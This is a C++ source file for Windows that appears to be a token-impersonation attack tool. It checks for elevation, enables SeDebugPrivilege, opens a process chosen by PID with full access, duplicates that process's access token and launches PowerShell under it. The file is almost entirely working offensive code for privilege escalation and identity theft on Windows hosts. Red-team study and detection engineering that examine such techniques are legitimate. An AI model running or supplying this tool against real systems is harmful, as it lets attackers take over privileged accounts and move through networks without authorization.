#include <windows.h>
#include <iostream>
#include <string>
#include <tchar.h>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <sddl.h>
#pragma comment(lib, "ntdll")
using namespace std;

BOOL EnablePrivilege();
bool IsElevatedProcess();
void ImpersonateProcess();
void Runner(HANDLE token);

int main() {
    HANDLE impersonatedTokenHandle = NULL;

    if (IsElevatedProcess()) {
        Sleep(5000);
        EnablePrivilege();
        cerr <<"[+] Enable Privilage SuccessFUll"<<endl;
        Sleep(5000);
        ImpersonateProcess();
        Sleep(5000);
        Sleep(5000);
    }
    else {
        cout << "[-] Failed  Enable privileges." << endl;
    }
    return 0;
}


BOOL EnablePrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        cout << "[-] Open ProcessToken Failed Error: " << GetLastError() << endl;
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        cout << "[-]  PrivilegeValue Failed Error: " << GetLastError() << endl;
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        cout << "[-] Token Privileges Failed Error: " << GetLastError() << endl;
        CloseHandle(hToken);
        return FALSE;
    }

    DWORD dwError = GetLastError();
    if (dwError == ERROR_NOT_ALL_ASSIGNED) {
        cout << "[-] Errorr privilege !!! " << endl;
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}
/********************************************************************/
bool IsElevatedProcess() {
    bool isElevated = false;
    HANDLE token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD token_check = sizeof(TOKEN_ELEVATION);

        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &token_check)) {
            isElevated = elevation.TokenIsElevated;
            if (isElevated) {
                cout << "[+] Process is running with elevated privileges." << endl;
            }
            else {
                cout << "[!] Process is not running with elevated privileges." << endl;
            }
        }
        else {
            cout << "[-] Failed to get token information. Error: " << GetLastError() << endl;
        }
    }
    else {
        cout << "[-] Failed to open process token. Error: " << GetLastError() << endl;
    }

    if (token) {
        CloseHandle(token);
    }

    return isElevated;
}
/********************************************************************/
void ImpersonateProcess() {
    DWORD TargetPID;
    
    cout << "[+] RUN... \n" << endl;
    Sleep(1000);
    cout << "[+] This Program For Token impersonation \n" << endl;
    Sleep(1000);
    cout << "[+] Enter PID for Target process : ";

    cin >> TargetPID;
    HANDLE hProcess1 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);
    if (hProcess1 == NULL) {
        cerr << "Failed to open process  Error: " << TargetPID << ": " << GetLastError() << endl;
        return;  }


    //    TargetPID -> hProcess1  OpenProcess -> hToken1  OpenProcessToken -> hTokenNew DuplicateTokenEx == void Runner CreateProcessWithTokenW
    
    HANDLE hToken1;
    if (!OpenProcessToken(hProcess1, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken1)) {
        cerr << "Failed to open process token for process  Error: " << TargetPID << ": " << GetLastError() << endl;
        CloseHandle(hProcess1);
        return;
    }

    HANDLE hTokenNew;
    if (!DuplicateTokenEx(hToken1, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hTokenNew)) {
        cerr << "Failed to duplicate token  Error : " << GetLastError() << endl;
        CloseHandle(hToken1);
        CloseHandle(hProcess1);
        return; }
   
    Runner(hTokenNew);
    CloseHandle(hTokenNew);
    CloseHandle(hToken1);
    CloseHandle(hProcess1); }

void Runner(HANDLE Token) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessWithTokenW(Token, LOGON32_LOGON_INTERACTIVE, L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", NULL, 0, NULL, NULL, &si, &pi)) {
        cout << "Failed to create process with token Error: " << GetLastError() << endl;
    }

    else {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}